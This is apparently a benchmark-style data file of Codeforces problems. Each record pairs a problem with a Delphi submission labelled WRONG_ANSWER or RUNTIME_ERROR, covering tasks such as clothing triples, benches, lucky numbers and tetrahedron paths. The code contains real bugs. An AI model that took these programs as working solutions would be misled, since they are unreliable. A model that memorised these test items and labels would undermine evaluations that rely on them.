{"difficulty":1200,"lang":"Delphi","lang_cluster":"delphi","src_uid":"102_A","submission_id":"3346828","tags":["brute+force"],"exec_outcome":"WRONG_ANSWER","source_code":"program Project1;\r\n\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils,math;\r\n\r\nvar\r\n  a:array[0..101,0..101] of boolean;\r\n  b:array[0..101] of longint;\r\n  i,j,n,m,x,y,k,ans:longint;\r\n\r\nbegin\r\n  read(n,m);\r\n  for i:=1 to n do\r\n    read(b[i]);\r\n  for i:=1 to m do\r\n    begin\r\n      read(x,y);\r\n      a[x][y]:=true;\r\n      a[y][x]:=true;\r\n    end;\r\n  ans:=maxlongint;\r\n  for i:=1 to n do\r\n    for j:=1 to n do\r\n      for k:=1 to n do\r\n        if (a[i][j]) and (a[i][k]) and (a[k][j]) then\r\n           ans:=min(ans,b[i]+b[j]+b[k]);\r\n  writeln(ans);\r\nend.\r\n","description":"A little boy Gerald entered a clothes shop and found out something very unpleasant: not all clothes turns out to match. For example, Gerald noticed that he looks rather ridiculous in a smoking suit and a baseball cap.Overall the shop sells n clothing items, and exactly m pairs of clothing items match. Each item has its price, represented by an integer number of rubles. Gerald wants to buy three clothing items so that they matched each other. Besides, he wants to spend as little money as possible. Find the least possible sum he can spend.","input_from":"standard input","output_to":"standard output","input_spec":"The first input file line contains integers n and m \u2014 the total number of clothing items in the shop and the total number of matching pairs of clothing items ().\nNext line contains n integers ai (1\u2264ai\u226410^6) \u2014 the prices of the clothing items in rubles.\nNext m lines each contain a pair of space-separated integers ui and vi (1\u2264ui,vi\u2264n,ui\u2260vi). Each such pair of numbers means that the ui-th and the vi-th clothing items match each other. It is guaranteed that in each pair ui and vi are distinct and all the unordered pairs (ui,vi) are different.\n","output_spec":"Print the only number \u2014 the least possible sum in rubles that Gerald will have to pay in the shop. If the shop has no three clothing items that would match each other, print \"-1\" (without the quotes).\n","notes":"In the first test there only are three pieces of clothing and they all match each other. Thus, there is only one way \u2014 to buy the 3 pieces of clothing; in this case he spends 6 roubles.\nThe second test only has three pieces of clothing as well, yet Gerald can't buy them because the first piece of clothing does not match the third one. Thus, there are no three matching pieces of clothing. The answer is -1.\nIn the third example there are 4 pieces of clothing, but Gerald can't buy any 3 of them simultaneously. The answer is -1.\n","sample_inputs":["3 3\n1 2 3\n1 2\n2 3\n3 1\n","3 2\n2 3 4\n2 3\n2 1\n","4 4\n1 1 1 1\n1 2\n2 3\n3 4\n4 1\n"],"sample_outputs":["6\n","-1\n","-1\n"]}
{"difficulty":1100,"lang":"Delphi","lang_cluster":"delphi","src_uid":"1042_A","submission_id":"43824204","tags":["binary+search","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"program passwordick;\r\n\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils;\r\n\r\nvar\r\n    a: array [1..100]of integer;\r\n    n, m, i, max, s: integer;\r\nbegin\r\n    readln (n);\r\n    readln (m);\r\n    max := -1;\r\n    for i := 1 to n do\r\n    begin\r\n        readln (a[i]);\r\n        if a[i] > max then\r\n            max := a[i];\r\n    end;\r\n\r\n    s := 0;\r\n    for i := 1 to n do\r\n        s := s + max - a[i];\r\n\r\n    i := (m - s)div n + max;\r\n    \/\/writeln (n,' ',m,' ',s,' ',max,' ',i );\r\n    if ((m - s) mod n > 0) then\r\n        inc(i);\r\n    writeln (i, ' ', max + m);\r\n    readln;\r\nend.\r\n","description":"There are $$$n$$$ benches in the Berland Central park. It is known that $$$a_i$$$ people are currently sitting on the $$$i$$$-th bench. Another $$$m$$$ people are coming to the park and each of them is going to have a seat on some bench out of $$$n$$$ available.Let $$$k$$$ be the maximum number of people sitting on one bench after additional $$$m$$$ people came to the park. Calculate the minimum possible $$$k$$$ and the maximum possible $$$k$$$.Nobody leaves the taken seat during the whole process.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer $$$n$$$ $$$(1 \\\\le n \\\\le 100)$$$ \u2014 the number of benches in the park.\nThe second line contains a single integer $$$m$$$ $$$(1 \\\\le m \\\\le 10\\\\,000)$$$ \u2014 the number of people additionally coming to the park.\nEach of the next $$$n$$$ lines contains a single integer $$$a_i$$$ $$$(1 \\\\le a_i \\\\le 100)$$$ \u2014 the initial number of people on the $$$i$$$-th bench.\n","output_spec":"Print the minimum possible $$$k$$$ and the maximum possible $$$k$$$, where $$$k$$$ is the maximum number of people sitting on one bench after additional $$$m$$$ people came to the park.\n","notes":"In the first example, each of four benches is occupied by a single person. The minimum $$$k$$$ is $$$3$$$. For example, it is possible to achieve if two newcomers occupy the first bench, one occupies the second bench, one occupies the third bench, and two remaining \u2014 the fourth bench. The maximum $$$k$$$ is $$$7$$$. That requires all six new people to occupy the same bench.\nThe second example has its minimum $$$k$$$ equal to $$$15$$$ and maximum $$$k$$$ equal to $$$15$$$, as there is just a single bench in the park and all $$$10$$$ people will occupy it.\n","sample_inputs":["4\n6\n1\n1\n1\n1\n","1\n10\n5\n","3\n6\n1\n6\n5\n","3\n7\n1\n6\n5\n"],"sample_outputs":["3 7\n","15 15\n","6 12\n","7 13\n"]}
{"difficulty":900,"lang":"Delphi","lang_cluster":"delphi","src_uid":"115_A","submission_id":"30252523","tags":["dfs+and+similar","graphs","trees"],"exec_outcome":"WRONG_ANSWER","source_code":"program Project2;\r\n\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils, Math;\r\n\r\nvar\r\n  list, head, next, mark: array[1..2000] of integer;\r\n  i, ct, pos, s, ans, n: integer;\r\n\r\nprocedure add (a, b: integer);\r\nbegin\r\n  inc(pos);\r\n  list[pos] := b;\r\n  next[pos] := head[a];\r\n  head[a] := pos;\r\nend;\r\n\r\nprocedure dfs(v: integer);\r\nvar\r\n  i: integer;\r\nbegin\r\n  mark[v] := 1;\r\n  inc(ct);\r\n  ans := max(ans, ct);\r\n  i := head[v];\r\n  while (i <> 0) do begin\r\n    if (mark[list[i]] <> 1) then\r\n      dfs(list[i]);\r\n    i := next[i];  \r\n  end;\r\n  dec(ct);\r\nend;\r\n\r\nbegin\r\n  \/\/s\r\n  readln(n);\r\n  pos := 0;\r\n  ans := 0;\r\n  for i := 1 to n do begin\r\n    readln(s);\r\n    if (s <> -1) then\r\n      add(i, s);\r\n  end;\r\n  for i := 1 to n do\r\n    if (mark[i] <> 1) then begin\r\n      ct := 0;\r\n      dfs(i);\r\n    end;\r\n    \r\n  writeln(ans);\r\n  readln;\r\n  readln;\r\nend.\r\n","description":"A company has n employees numbered from 1 to n. Each employee either has no immediate manager or exactly one immediate manager, who is another employee with a different number. An employee A is said to be the superior of another employee B if at least one of the following is true:  Employee A is the immediate manager of employee B  Employee B has an immediate manager employee C such that employee A is the superior of employee C. The company will not have a managerial cycle. That is, there will not exist an employee who is the superior of his\/her own immediate manager.Today the company is going to arrange a party. This involves dividing all n employees into several groups: every employee must belong to exactly one group. Furthermore, within any single group, there must not be two employees A and B such that A is the superior of B.What is the minimum number of groups that must be formed?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (1\u2264n\u22642000) \u2014 the number of employees.\nThe next n lines contain the integers pi (1\u2264pi\u2264n or pi=-1). Every pi denotes the immediate manager for the i-th employee. If pi is -1, that means that the i-th employee does not have an immediate manager. \nIt is guaranteed, that no employee will be the immediate manager of him\/herself (pi\u2260i). Also, there will be no managerial cycles.\n","output_spec":"Print a single integer denoting the minimum number of groups that will be formed in the party.\n","notes":"For the first example, three groups are sufficient, for example: \n  Employee 1  Employees 2 and 4  Employees 3 and 5 ","sample_inputs":["5\n-1\n1\n2\n1\n-1\n"],"sample_outputs":["3\n"]}
{"difficulty":1000,"lang":"Delphi","lang_cluster":"delphi","src_uid":"122_A","submission_id":"106350740","tags":["brute+force","number+theory"],"exec_outcome":"WRONG_ANSWER","source_code":"program Project2;\r\n\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils;\r\n\r\nconst\r\n  Divisors: array[1..5] of Integer\r\n    = (4, 7, 44, 47, 74);\r\n\r\nvar\r\n  I, n: Integer;\r\n  isDivisible: Boolean;\r\n\r\nbegin\r\n  readln(n);\r\n\r\n  isDivisible := false;\r\n\r\n  for I := Low(Divisors) to High(Divisors) do\r\n  begin\r\n    isDivisible := (n mod Divisors[I]) = 0;\r\n    if isDivisible then\r\n      break;\r\n  end;\r\n\r\n  if isDivisible then\r\n    writeln('YES')\r\n  else\r\n    writeln('NO');\r\n\r\n  readln;\r\nend.\r\n","description":"Petya loves lucky numbers. Everybody knows that lucky numbers are positive integers whose decimal representation contains only the lucky digits 4 and 7. For example, numbers 47, 744, 4 are lucky and 5, 17, 467 are not.Petya calls a number almost lucky if it could be evenly divided by some lucky number. Help him find out if the given number n is almost lucky.","input_from":"standard input","output_to":"standard output","input_spec":"The single line contains an integer n (1\u2264n\u22641000) \u2014 the number that needs to be checked.\n","output_spec":"In the only line print \"YES\" (without the quotes), if number n is almost lucky. Otherwise, print \"NO\" (without the quotes).\n","notes":"Note that all lucky numbers are almost lucky as any number is evenly divisible by itself.\nIn the first sample 47 is a lucky number. In the second sample 16 is divisible by 4.\n","sample_inputs":["47\n","16\n","78\n"],"sample_outputs":["YES\n","YES\n","NO\n"]}
{"difficulty":900,"lang":"Delphi","lang_cluster":"delphi","src_uid":"129_A","submission_id":"6062061","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"program Project2;\r\n\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils;\r\n        var n,s,i,z:integer;\r\n    a: array of integer;\r\n    q:boolean;\r\nbegin\r\n  { TODO -oUser -cConsole Main : Insert code here }\r\n\r\n\r\n\r\n readln(n);\r\n setlength(a,n);\r\n s:=0;\r\n z:=0;\r\n for i:=0 to n-1 do\r\n   begin\r\n   read(a[i]);\r\n   s:=a[i]+s;\r\n   end;\r\n    \/\/ if s=1 then z:=1;\r\n   if s mod 2 <> 0 then q:=false\r\n   else q:=true;\r\n\r\n   if q then begin\r\n   for i:=0 to n-1 do\r\n   if a[i] mod 2=0 then z:=z+1;\r\n          end;\r\n   if not q then begin\r\n   for i:=0 to n-1 do\r\n    if s-a[i] mod 2=0 then z:=z+1;\r\n    end;\r\n    writeln(z);\r\n    readln;\r\n    readln;\r\nend.\r\n","description":"Olga came to visit the twins Anna and Maria and saw that they have many cookies. The cookies are distributed into bags. As there are many cookies, Olga decided that it's no big deal if she steals a bag. However, she doesn't want the sisters to quarrel because of nothing when they divide the cookies. That's why Olga wants to steal a bag with cookies so that the number of cookies in the remaining bags was even, that is, so that Anna and Maria could evenly divide it into two (even 0 remaining cookies will do, just as any other even number). How many ways there are to steal exactly one cookie bag so that the total number of cookies in the remaining bags was even?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the only integer n (1\u2264n\u2264100) \u2014 the number of cookie bags Anna and Maria have. The second line contains n integers ai (1\u2264ai\u2264100) \u2014 the number of cookies in the i-th bag.\n","output_spec":"Print in the only line the only number \u2014 the sought number of ways. If there are no such ways print 0.\n","notes":"In the first sample Olga should take the only bag so that the twins ended up with the even number of cookies.\nIn the second sample Olga can take any of five bags with two cookies or any of three bags with four cookies \u2014 5+3=8 ways in total.\nIn the third sample, no matter which bag with two cookies Olga chooses, the twins are left with 2*9+99=117 cookies. Thus, Olga has only one option: to take the bag with 99 cookies.\n","sample_inputs":["1\n1\n","10\n1 2 2 3 4 4 4 2 2 2\n","11\n2 2 2 2 2 2 2 2 2 2 99\n"],"sample_outputs":["1\n","8\n","1\n"]}
{"difficulty":1200,"lang":"Delphi","lang_cluster":"delphi","src_uid":"129_B","submission_id":"1762871","tags":["brute+force","dfs+and+similar","graphs","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"program ProjectA;\r\n\r\n{$APPTYPE CONSOLE}\r\n{$A+,B-,D-,E+,F+,G-,I-,L-,N+,O-,R-,Q-,V+,X+}\r\n\r\nuses\r\n  SysUtils,\r\n  Math;\r\n\r\nvar\r\n  n, m, i, u, j, t, v, res: integer;\r\n  g: array [1..101, 1..101] of integer;\r\n  nv, a: array [1..101] of integer;\r\n  ok: boolean;\r\n\r\nbegin\r\n  \/\/Reset(input, 'input.txt');\r\n  \/\/Rewrite(output, 'output.txt');\r\n\r\n  read(n, m);\r\n  for i := 1 to n do\r\n    nv[i] := 0;\r\n  for i := 1 to m do\r\n    begin\r\n      read(u, v);\r\n      inc(nv[u]);\r\n      inc(nv[v]);\r\n      g[u, nv[u]] := v;\r\n      g[v, nv[v]] := u;\r\n    end;\r\n\r\n  res := 0;\r\n  While True do\r\n    begin\r\n      ok := false;\r\n      for i := 1 to n do\r\n        a[i] := 0;\r\n      j := 0;\r\n      for i := 1 to n do\r\n        if nv[i] = 1 then\r\n          begin\r\n            ok := true;\r\n            nv[i] := 0;\r\n            inc(j);\r\n            a[j] := i;\r\n          end;\r\n      if ok then\r\n        begin\r\n          inc(res);\r\n          t := j;\r\n          for j := 1 to t do\r\n            dec(nv[g[a[j], 1]]);\r\n        end\r\n      else\r\n        begin\r\n          write(res);\r\n          exit;\r\n        end;\r\n\r\n    end;\r\n\r\nend.\r\n","description":"Anna and Maria are in charge of the math club for junior students. When the club gathers together, the students behave badly. They've brought lots of shoe laces to the club and got tied with each other. Specifically, each string ties together two students. Besides, if two students are tied, then the lace connects the first student with the second one as well as the second student with the first one.To restore order, Anna and Maria do the following. First, for each student Anna finds out what other students he is tied to. If a student is tied to exactly one other student, Anna reprimands him. Then Maria gathers in a single group all the students who have been just reprimanded. She kicks them out from the club. This group of students immediately leaves the club. These students takes with them the laces that used to tie them. Then again for every student Anna finds out how many other students he is tied to and so on. And they do so until Anna can reprimand at least one student.Determine how many groups of students will be kicked out of the club.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m \u2014 the initial number of students and laces (). The students are numbered from 1 to n, and the laces are numbered from 1 to m. Next m lines each contain two integers a and b \u2014 the numbers of students tied by the i-th lace (1\u2264a,b\u2264n,a\u2260b). It is guaranteed that no two students are tied with more than one lace. No lace ties a student to himself.\n","output_spec":"Print the single number \u2014 the number of groups of students that will be kicked out from the club.\n","notes":"In the first sample Anna and Maria won't kick out any group of students \u2014 in the initial position every student is tied to two other students and Anna won't be able to reprimand anyone.\nIn the second sample four students are tied in a chain and two more are running by themselves. First Anna and Maria kick out the two students from both ends of the chain (1 and 4), then \u2014 two other students from the chain (2 and 3). At that the students who are running by themselves will stay in the club.\nIn the third sample Anna and Maria will momentarily kick out all students except for the fourth one and the process stops at that point. The correct answer is one.\n","sample_inputs":["3 3\n1 2\n2 3\n3 1\n","6 3\n1 2\n2 3\n3 4\n","6 5\n1 4\n2 4\n3 4\n5 4\n6 4\n"],"sample_outputs":["0\n","2\n","1\n"]}
{"difficulty":1100,"lang":"Delphi","lang_cluster":"delphi","src_uid":"12_C","submission_id":"22107392","tags":["greedy","implementation","sortings"],"exec_outcome":"WRONG_ANSWER","source_code":"program Project1;\r\n\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils;\r\n\r\ntype\r\n\tTFruit = record\r\n\t\tname: string;\r\n\t\tcount: Integer;\r\n\tend;\r\n\r\nvar\r\n\tf: array[1..100] of TFruit;\r\n\tt: TFruit;\r\n\ts: string;\r\n\tn, m, i, j, tmp, min, max: Integer;\r\n\tp: array[1..100] of Integer;\r\n\r\nbegin\r\n\tReadln(n, m);\r\n\tFillChar(f, sizeof(f), 0);\r\n\tFillChar(p, sizeof(p), 0);\r\n\tfor i:=1 to n do Read(p[i]);\r\n\tReadln;\r\n\tfor i:=1 to m do\r\n\tbegin\r\n\t\tReadln(s);\r\n\t\tfor j:=1 to m do\r\n\t\tbegin\r\n\t\t\tif f[j].name='' then\r\n\t\t\tbegin\r\n\t\t\t\tf[j].name := s;\r\n\t\t\t\tf[j].count := 1;\r\n\t\t\t\tbreak;\r\n\t\t\tend;\r\n\t\t\tif f[j].name=s then\r\n\t\t\tbegin\r\n\t\t\t\tInc(f[j].count);\r\n\t\t\t\tbreak;\r\n\t\t\tend;\r\n\t\tend;\r\n\tend;\r\n\tfor i:=1 to n-1 do\r\n\tfor j:=i+1 to n do\r\n\tbegin\r\n\t\tif p[i]>p[j] then\r\n\t\tbegin\r\n\t\t\ttmp := p[i]; p[i] := p[j]; p[j] := tmp;\r\n\t\tend;\r\n\tend;\r\n\tfor i:=1 to m-1 do\r\n\tbegin\r\n\t\tif f[i].name='' then break;\r\n\t\tfor j:=i+1 to m do\r\n\t\tbegin\r\n\t\t\tif f[j].name='' then break;\r\n\t\t\tif f[i].count>f[j].count then\r\n\t\t\tbegin\r\n\t\t\t\tt := f[i]; f[i] := f[j]; f[j] := t;\r\n\t\t\tend;\r\n\t\tend;\r\n\tend;\r\n\tm := i-1;\r\n\r\n\tmin := 0;\r\n\tmax := 0;\r\n\tfor i:=1 to m do\r\n\tbegin\r\n\t\tInc(min, f[m+1-i].count*p[i]);\r\n\t\tInc(max, f[m+1-i].count*p[n+1-i]);\r\n\tend;\r\n\r\n\twriteln(min, ' ', max);\r\n\r\nend.\r\n","description":"The spring is coming and it means that a lot of fruits appear on the counters. One sunny day little boy Valera decided to go shopping. He made a list of m fruits he wanted to buy. If Valera want to buy more than one fruit of some kind, he includes it into the list several times. When he came to the fruit stall of Ashot, he saw that the seller hadn't distributed price tags to the goods, but put all price tags on the counter. Later Ashot will attach every price tag to some kind of fruits, and Valera will be able to count the total price of all fruits from his list. But Valera wants to know now what can be the smallest total price (in case of the most \u00ablucky\u00bb for him distribution of price tags) and the largest total price (in case of the most \u00abunlucky\u00bb for him distribution of price tags).","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains two integer number n and m (1\u2264n,m\u2264100) \u2014 the number of price tags (which is equal to the number of different kinds of fruits that Ashot sells) and the number of items in Valera's list. The second line contains n space-separated positive integer numbers. Each of them doesn't exceed 100 and stands for the price of one fruit of some kind. The following m lines contain names of the fruits from the list. Each name is a non-empty string of small Latin letters which length doesn't exceed 32. It is guaranteed that the number of distinct fruits from the list is less of equal to n. Also it is known that the seller has in stock all fruits that Valera wants to buy.\n","output_spec":"Print two numbers a and b (a\u2264b) \u2014 the minimum and the maximum possible sum which Valera may need to buy all fruits from his list.\n","notes":null,"sample_inputs":["5 3\n4 2 1 10 5\napple\norange\nmango\n","6 5\n3 5 1 6 8 1\npeach\ngrapefruit\nbanana\norange\norange\n"],"sample_outputs":["7 19\n","11 30\n"]}
{"difficulty":1400,"lang":"Delphi","lang_cluster":"delphi","src_uid":"131_C","submission_id":"3872309","tags":["combinatorics","math"],"exec_outcome":"WRONG_ANSWER","source_code":"program Project2;\r\n\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils,math;\r\n\r\nvar\r\n  c:array[0..30,0..30] of int64;\r\n  i,n,m,k,j,l:longint;\r\n  ans:int64;\r\n\r\nbegin\r\n  read(n,m,k);\r\n  l:=max(n,m);\r\n  for i:=1 to l do\r\n    for j:=0 to i do\r\n      if (j = 0) or (j = i) then\r\n        C[i][j]:=1\r\n      else C[i][j]:=C[i-1][j] + C[i-1][j-1];\r\n  for j:=4 to l do\r\n    if (k - j >= 1) then\r\n      inc(ans,C[n][j]*C[m][k-j]);\r\n  writeln(ans);\r\nend.","description":"There are n boys and m girls attending a theatre club. To set a play \"The Big Bang Theory\", they need to choose a group containing exactly t actors containing no less than 4 boys and no less than one girl. How many ways are there to choose a group? Of course, the variants that only differ in the composition of the troupe are considered different.Perform all calculations in the 64-bit type: long long for \u0421\/\u0421++, int64 for Delphi and long for Java.","input_from":"standard input","output_to":"standard output","input_spec":"The only line of the input data contains three integers n, m, t (4\u2264n\u226430,1\u2264m\u226430,5\u2264t\u2264n+m).\n","output_spec":"Find the required number of ways.\nPlease do not use the %lld specificator to read or write 64-bit integers in \u0421++. It is preferred to use cin, cout streams or the %I64d specificator.\n","notes":null,"sample_inputs":["5 2 5\n","4 3 5\n"],"sample_outputs":["10\n","3\n"]}
{"difficulty":900,"lang":"Delphi","lang_cluster":"delphi","src_uid":"149_A","submission_id":"8588052","tags":["greedy","implementation","sortings"],"exec_outcome":"WRONG_ANSWER","source_code":"{$A8,B-,C+,D+,E-,F-,G+,H+,I+,J-,K-,L+,M-,N+,O+,P+,Q-,R-,S-,T-,U-,V+,W-,X+,Y+,Z1}\r\n{$MINSTACKSIZE $00004000}\r\n{$MAXSTACKSIZE $00100000}\r\n{$IMAGEBASE $00400000}\r\n{$APPTYPE CONSOLE}\r\n\r\n\r\nconst oo=1e+21;\r\n      eps=1e-9;\r\n      dohuya=maxlongint div 2;\r\n\r\nvar ss,sss:array[0..201500]of string;\r\n    s,s0,s1,s2,s3:string;\r\n    a,aaa:array[0..2015,0..2015]of longint;\r\n    qq,cc,qc:array[0..1000000]of longint;\r\n    q,c,q0,c0,q1,c1,q2,c2,q3,c3,r,res,cur,n,m,i,j,k:longint;\r\n    x,y,z,xx,yy,zz,x0,y0,z0,x1,x2,x3,y1,y2,y3,z1,z2,z3:extended;\r\n    ch:char;\r\n    b,bb:boolean;\r\n\r\nbegin\r\nread(k);\r\nfor i:=1 to 12 do read(qc[i]);\r\nfor i:=1 to 12 do\r\n  for j:=i+1 to 12 do\r\n    if qc[i]<qc[j] then\r\n      begin\r\n      qc[0]:=qc[i]; qc[i]:=qc[j]; qc[j]:=qc[0];\r\n      end;\r\nres:=0;\r\nfor i:=1 to 12 do\r\n  begin\r\n  if k>0 then inc(res);\r\n  dec(k,qc[i]);\r\n  end;\r\nif k<0 then writeln('-1') else writeln(res);\r\nend.\r\n","description":"What joy! Petya's parents went on a business trip for the whole year and the playful kid is left all by himself. Petya got absolutely happy. He jumped on the bed and threw pillows all day long, until... Today Petya opened the cupboard and found a scary note there. His parents had left him with duties: he should water their favourite flower all year, each day, in the morning, in the afternoon and in the evening. \"Wait a second!\" \u2014 thought Petya. He know for a fact that if he fulfills the parents' task in the i-th (1\u2264i\u226412) month of the year, then the flower will grow by ai centimeters, and if he doesn't water the flower in the i-th month, then the flower won't grow this month. Petya also knows that try as he might, his parents won't believe that he has been watering the flower if it grows strictly less than by k centimeters. Help Petya choose the minimum number of months when he will water the flower, given that the flower should grow no less than by k centimeters.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains exactly one integer k (0\u2264k\u2264100). The next line contains twelve space-separated integers: the i-th (1\u2264i\u226412) number in the line represents ai (0\u2264ai\u2264100). \n","output_spec":"Print the only integer \u2014 the minimum number of months when Petya has to water the flower so that the flower grows no less than by k centimeters. If the flower can't grow by k centimeters in a year, print -1.\n","notes":"Let's consider the first sample test. There it is enough to water the flower during the seventh and the ninth month. Then the flower grows by exactly five centimeters.\nIn the second sample Petya's parents will believe him even if the flower doesn't grow at all (k=0). So, it is possible for Petya not to water the flower at all.\n","sample_inputs":["5\n1 1 1 1 2 2 3 2 2 1 1 1\n","0\n0 0 0 0 0 0 0 1 1 2 3 0\n","11\n1 1 4 1 1 5 1 1 4 1 1 1\n"],"sample_outputs":["2\n","0\n","3\n"]}
{"difficulty":800,"lang":"Delphi","lang_cluster":"delphi","src_uid":"14_A","submission_id":"3664623","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"program Project1;\r\n\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils;\r\n\r\nvar\r\n  i,j,k,n,m,g,g1,k1,h,f:Integer;\r\n  s1,s2:string;\r\n  s:array[1..10000] of string;\r\nbegin\r\n  Readln(n,m);\r\n  g:=1000000;\r\n  for i:=1 to n do\r\n    begin\r\n      Readln(s[i]);\r\n      s1:=s[i];\r\n      k:=0;\r\n      k1:=0;\r\n      for j:=1 to Length(s1) do if (k=0) and (s1[j]='*') then k:=j;\r\n      for j:=Length(s1) downto 1 do if (k1=0) and (s1[j]='*') then k1:=j;\r\n      if (k<g) and (k<>0) then g:=k;\r\n      if (k1>g1) and (k1<>0) then g1:=k1;\r\n    end;\r\n  k1:=0;\r\n  for i:=1 to n do\r\n    begin\r\n      k:=0;\r\n      s1:=s[i];\r\n      f:=0;\r\n      for j:=1 to Length(s1) do\r\n          if (s1[j]='*') then inc (k);\r\n      if (k>0) then inc (k1);\r\n      for h:=i+1 to n do\r\n        begin\r\n          s2:=s[h];\r\n          if (s1[h]='*') then inc (f);\r\n        end;\r\n      if (k1>0) and (f>0) then\r\n        begin\r\n          for h:=g to g1 do write(s1[h]);\r\n          if (i<>n) then Writeln;\r\n        end;\r\n    end;\r\n  Readln;\r\n  Readln;\r\nend.\r\n ","description":"A boy Bob likes to draw. Not long ago he bought a rectangular graph (checked) sheet with n rows and m columns. Bob shaded some of the squares on the sheet. Having seen his masterpiece, he decided to share it with his elder brother, who lives in Flatland. Now Bob has to send his picture by post, but because of the world economic crisis and high oil prices, he wants to send his creation, but to spend as little money as possible. For each sent square of paper (no matter whether it is shaded or not) Bob has to pay 3.14 burles. Please, help Bob cut out of his masterpiece a rectangle of the minimum cost, that will contain all the shaded squares. The rectangle's sides should be parallel to the sheet's sides.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains numbers n and m (1\u2264n,m\u226450), n \u2014 amount of lines, and m \u2014 amount of columns on Bob's sheet. The following n lines contain m characters each. Character \u00ab.\u00bb stands for a non-shaded square on the sheet, and \u00ab*\u00bb \u2014 for a shaded square. It is guaranteed that Bob has shaded at least one square.\n","output_spec":"Output the required rectangle of the minimum cost. Study the output data in the sample tests to understand the output format better.\n","notes":null,"sample_inputs":["6 7\n.......\n..***..\n..*....\n..***..\n..*....\n..***..\n","3 3\n***\n*.*\n***\n"],"sample_outputs":["***\n*..\n***\n*..\n***\n","***\n*.*\n***\n"]}
{"difficulty":1500,"lang":"Delphi","lang_cluster":"delphi","src_uid":"166_E","submission_id":"20953175","tags":["dp","math","matrices"],"exec_outcome":"WRONG_ANSWER","source_code":"const m:longint= 1000000007;\r\nvar i,newd,newabc,d,abc,n:longint;\r\nbegin\r\n read(n);\r\n D:=0;\r\n ABC:=1;\r\n for i:=2 to n do\r\n  begin\r\n   NewABC:=(ABC*2+D) mod M;\r\n   NewD:=(ABC*3) mod M;\r\n   ABC:=NewABC;\r\n   D:=NewD;\r\n  end;\r\n write(D);\r\n\r\nend.","description":"You are given a tetrahedron. Let's mark its vertices with letters A, B, C and D correspondingly. An ant is standing in the vertex D of the tetrahedron. The ant is quite active and he wouldn't stay idle. At each moment of time he makes a step from one vertex to another one along some edge of the tetrahedron. The ant just can't stand on one place.You do not have to do much to solve the problem: your task is to count the number of ways in which the ant can go from the initial vertex D to itself in exactly n steps. In other words, you are asked to find out the number of different cyclic paths with the length of n from vertex D to itself. As the number can be quite large, you should print it modulo 1000000007 (10^9+7). ","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the only integer n (1\u2264n\u226410^7) \u2014 the required length of the cyclic path.\n","output_spec":"Print the only integer \u2014 the required number of ways modulo 1000000007 (10^9+7).\n","notes":"The required paths in the first sample are: \n  D-A-D  D-B-D  D-C-D ","sample_inputs":["2\n","4\n"],"sample_outputs":["3\n","21\n"]}
{"difficulty":800,"lang":"Delphi","lang_cluster":"delphi","src_uid":"172_A","submission_id":"3661251","tags":["*special","brute+force","implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"program ProjectKROK1;\r\n\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils;\r\n\r\nvar\r\n  s:array[1..100000] of string;\r\n  i,j,k,n:Integer;\r\n  s1,s2,s3:string;\r\nbegin\r\n  Readln(n);\r\n  for i:=1 to n do Readln(s[i]);\r\n  s3:=s[1];\r\n  for i:=1 to Length(s3) do\r\n    begin\r\n      s2:=s[i];\r\n      Inc(k);\r\n      for j:=1 to n do\r\n        begin\r\n          s1:=s[j];\r\n          if (s2[k]<>s1[k]) then\r\n            begin\r\n              Writeln(k-1);\r\n              Readln;\r\n              Exit;\r\n            end;\r\n        end;\r\n    end;\r\n  Writeln(k);\r\n  Readln;\r\n  Readln;\r\nend.\r\n ","description":"Polycarpus has n friends in Tarasov city. Polycarpus knows phone numbers of all his friends: they are strings s1,s2,...,sn. All these strings consist only of digits and have the same length. Once Polycarpus needed to figure out Tarasov city phone code. He assumed that the phone code of the city is the longest common prefix of all phone numbers of his friends. In other words, it is the longest string c which is a prefix (the beginning) of each si for all i (1\u2264i\u2264n). Help Polycarpus determine the length of the city phone code. ","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains an integer n (2\u2264n\u22643\u00b710^4) \u2014 the number of Polycarpus's friends. The following n lines contain strings s1,s2,...,sn \u2014 the phone numbers of Polycarpus's friends. It is guaranteed that all strings consist only of digits and have the same length from 1 to 20, inclusive. It is also guaranteed that all strings are different.\n","output_spec":"Print the number of digits in the city phone code.\n","notes":"A prefix of string t is a string that is obtained by deleting zero or more digits from the end of string t. For example, string \"00209\" has 6 prefixes: \"\" (an empty prefix), \"0\", \"00\", \"002\", \"0020\", \"00209\".\nIn the first sample the city phone code is string \"00\".\nIn the second sample the city phone code is an empty string.\nIn the third sample the city phone code is string \"770123456789\".\n","sample_inputs":["4\n00209\n00219\n00999\n00909\n","2\n1\n2\n","3\n77012345678999999999\n77012345678901234567\n77012345678998765432\n"],"sample_outputs":["2\n","0\n","12\n"]}
